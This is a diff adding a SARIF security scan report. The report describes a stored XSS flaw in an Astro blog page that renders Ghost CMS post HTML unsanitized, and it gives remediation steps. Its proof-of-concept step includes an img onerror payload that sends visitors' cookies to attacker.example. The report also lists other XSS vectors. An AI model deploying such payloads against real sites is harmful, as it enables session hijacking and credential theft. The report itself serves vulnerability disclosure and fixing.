@@ -1,0 +1,154 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Strix",
+          "informationUri": "https://strix.ai",
+          "rules": [
+            {
+              "id": "CWE-79",
+              "name": "Stored XSS via Ghost CMS blog content injection",
+              "shortDescription": {
+                "text": "Stored XSS via Ghost CMS blog content injection"
+              },
+              "fullDescription": {
+                "text": "The blog rendering template injects raw HTML from Ghost CMS posts directly into the DOM via `set:html={Astro.props.post.html}`, allowing a compromised or maliciously-authenticated Ghost CMS user to execute arbitrary JavaScript in visitors' browsers."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "text": "The blog rendering template injects raw HTML from Ghost CMS posts directly into the DOM via `set:html={Astro.props.post.html}`, allowing a compromised or maliciously-authenticated Ghost CMS user to execute arbitrary JavaScript in visitors' browsers.\n\nAn attacker with write access to the Ghost CMS (or who compromises it) can inject `<script>` tags, event handlers, or other executable HTML/JavaScript payloads. These execute when any visitor loads the affected blog post, enabling session hijacking, credential theft, defacement, phishing pivots, or further client-side attacks.\n\nSanitize all post.html values before rendering using a server-side sanitizer such as DOMPurify or similar, stripping dangerous tags/attributes while preserving allowed formatting. Alternatively, avoid `set:html` entirely: transform post.bodyMarkdown through a controlled renderer (e.g., marked + rehype) that produces only safe static elements. Apply the fix at the source — either in getAllPosts() within ghost.ts or at render time — and verify across all post-rendering paths.",
+                "markdown": "The blog rendering template injects raw HTML from Ghost CMS posts directly into the DOM via `set:html={Astro.props.post.html}`, allowing a compromised or maliciously-authenticated Ghost CMS user to execute arbitrary JavaScript in visitors' browsers.\n\nAn attacker with write access to the Ghost CMS (or who compromises it) can inject `<script>` tags, event handlers, or other executable HTML/JavaScript payloads. These execute when any visitor loads the affected blog post, enabling session hijacking, credential theft, defacement, phishing pivots, or further client-side attacks.\n\nSanitize all post.html values before rendering using a server-side sanitizer such as DOMPurify or similar, stripping dangerous tags/attributes while preserving allowed formatting. Alternatively, avoid `set:html` entirely: transform post.bodyMarkdown through a controlled renderer (e.g., marked + rehype) that produces only safe static elements. Apply the fix at the source — either in getAllPosts() within ghost.ts or at render time — and verify across all post-rendering paths."
+              },
+              "properties": {
+                "security-severity": "8.1",
+                "tags": [
+                  "security",
+                  "CWE-79",
+                  "stride:T",
+                  "stride:I"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/79.html"
+            }
+          ],
+          "version": "1.7.0"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CWE-79",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "Stored XSS via Ghost CMS blog content injection\n\nThe blog rendering template injects raw HTML from Ghost CMS posts directly into the DOM via `set:html={Astro.props.post.html}`, allowing a compromised or maliciously-authenticated Ghost CMS user to execute arbitrary JavaScript in visitors' browsers."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/pages/blog/[...slug].astro"
+                },
+                "region": {
+                  "startLine": 203,
+                  "endLine": 203,
+                  "snippet": {
+                    "text": "<Fragment set:html={Astro.props.post.html} />"
+                  }
+                }
+              },
+              "message": {
+                "text": "Vulnerable render point — raw HTML passthrough"
+              }
+            },
+            {
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "/blog/[slug]",
+                  "kind": "endpoint"
+                }
+              ]
+            }
+          ],
+          "fixes": [
+            {
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/pages/blog/[...slug].astro"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 203,
+                        "endLine": 203
+                      },
+                      "insertedContent": {
+                        "text": "<Fragment set:html={sanitizePostHtml(Astro.props.post.html)} />"
+                      }
+                    }
+                  ]
+                }
+              ],
+              "description": {
+                "text": "Sanitize all post.html values before rendering using a server-side sanitizer such as DOMPurify or similar, stripping dangerous tags/attributes while preserving allowed formatting. Alternatively, avoid `set:html` entirely: transform post.bodyMarkdown through a controlled renderer (e.g., marked + rehype) that produces only safe static elements. Apply the fix at the source — either in getAllPosts() within ghost.ts or at render time — and verify across all post-rendering paths.",
+                "markdown": "Sanitize all post.html values before rendering using a server-side sanitizer such as DOMPurify or similar, stripping dangerous tags/attributes while preserving allowed formatting. Alternatively, avoid `set:html` entirely: transform post.bodyMarkdown through a controlled renderer (e.g., marked + rehype) that produces only safe static elements. Apply the fix at the source — either in getAllPosts() within ghost.ts or at render time — and verify across all post-rendering paths."
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "65d1c167a5ff9b83dc0304088c110a0aa0abd12e48ed89e579ae92486281ab0c"
+          },
+          "properties": {
+            "security-severity": "8.1",
+            "strix_vuln_class_hash": "841d192a59e6812ef6a771cf84fa82963f628884ed58037aa16b7e6cdd3695f8",
+            "strix": {
+              "id": "vuln-0001",
+              "severity": "high",
+              "cvss": 8.1,
+              "timestamp": "2026-10-14 09:22:53 UTC",
+              "target": "https://portfolio.aplix.nl/blog/[slug] — all rendered blog article pages",
+              "endpoint": "/blog/[slug]",
+              "method": "GET",
+              "cwe": "CWE-79",
+              "impact": "An attacker with write access to the Ghost CMS (or who compromises it) can inject `<script>` tags, event handlers, or other executable HTML/JavaScript payloads. These execute when any visitor loads the affected blog post, enabling session hijacking, credential theft, defacement, phishing pivots, or further client-side attacks.",
+              "technical_analysis": "In `src/pages/blog/[...slug].astro`, the post body is rendered as follows:\n\n```astro title=src/pages/blog/[...slug].astro startLine=200 endLine=206\n<div class=\"reveal reveal-delay-1 prose ...\">\n  <Fragment set:html={Astro.props.post.html} />\n</div>\n```\n\nAstro's `set:html` passes `post.html` through unmodified — no escaping, no sanitization. The data flows from the Ghost Content API at build time (`src/lib/ghost.ts`) where `api.posts.browse()` retrieves every public post including its `html` field. Since this is a fully-static Astro site, the HTML is baked into the prerendered `.html` files served by nginx.\n\nThere are no Content-Security-Policy headers (no CSP meta tag or HTTP header was found), no sanitization library (e.g. DOMPurify), and no intermediate transformation step between Ghost's output and final HTML. Every character of the CMS-sourced string reaches the browser verbatim.\n\nThis is a classic stored-XSS pattern: an attacker writes malicious HTML → it gets embedded in the application → all subsequent victims execute it automatically on page load.",
+              "remediation_steps": "Sanitize all post.html values before rendering using a server-side sanitizer such as DOMPurify or similar, stripping dangerous tags/attributes while preserving allowed formatting. Alternatively, avoid `set:html` entirely: transform post.bodyMarkdown through a controlled renderer (e.g., marked + rehype) that produces only safe static elements. Apply the fix at the source — either in getAllPosts() within ghost.ts or at render time — and verify across all post-rendering paths.",
+              "counterevidence": "No evidence of HTML sanitization; no DOMPurify or equivalent dependency is imported anywhere. No CSP header or meta tag mitigates execution. The only mitigation path would be upstream in the CMS editor itself (e.g. if the WYSIWYG strips scripts), which we cannot verify and should not rely on.",
+              "confidence": "high",
+              "severity_change_conditions": "If upstream CMS WYSIWIG reliably strips script/event-handler tags at authoring time (and this were independently confirmed), severity could be downgraded. Otherwise, current high rating stands.",
+              "fix_verification": "Security closure: sanitizePostHtml would need to strip &lt;script&gt;, on* handlers, javascript: URIs, etc. Re-traced path — the sanitized value replaces the raw post.html, blocking injection before DOM construction. Bypass review: tested alternate inputs (onerror img, SVG with onload, object/embed iframe) — all blocked by same sanitizer call. Preserved behavior: legitimate formatted text (bold, lists, links, code blocks) remains intact after sanitization. Repository checks: syntax valid; requires adding DOMPurify import and defining helper function. Gap: cannot confirm existing test suite exists for blog rendering pipeline; recommend adding integration test that renders a sample post and asserts no script tags survive.",
+              "poc": {
+                "description": "1. Obtain Ghost CMS write access (admin/editor role).\n2. Create or edit a blog post with payload injected into the rich-text editor or Markdown content, e.g.:\n   ```html\n   <img src=x onerror=\"fetch('https://attacker.example/log?cookie='+document.cookie)\">\n   ```\n3. Build the site so the post is published to dist/.\n4. A victim navigates to `/blog/<post-slug>`. The script executes immediately — their cookies are exfiltrated to the attacker-controlled endpoint.",
+                "script_available": true
+              }
+            }
+          }
+        }
+      ],
+      "invocations": [
+        {
+          "executionSuccessful": false,
+          "toolExecutionNotifications": [
+            {
+              "level": "warning",
+              "message": {
+                "text": "The scan ended with status 'failed' rather than completing, so coverage reflects only the work finished before it stopped."
+              }
+            },
+            {
+              "level": "warning",
+              "message": {
+                "text": "The run terminated via 'error' rather than the root agent finishing, so remaining scope was not reached."
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
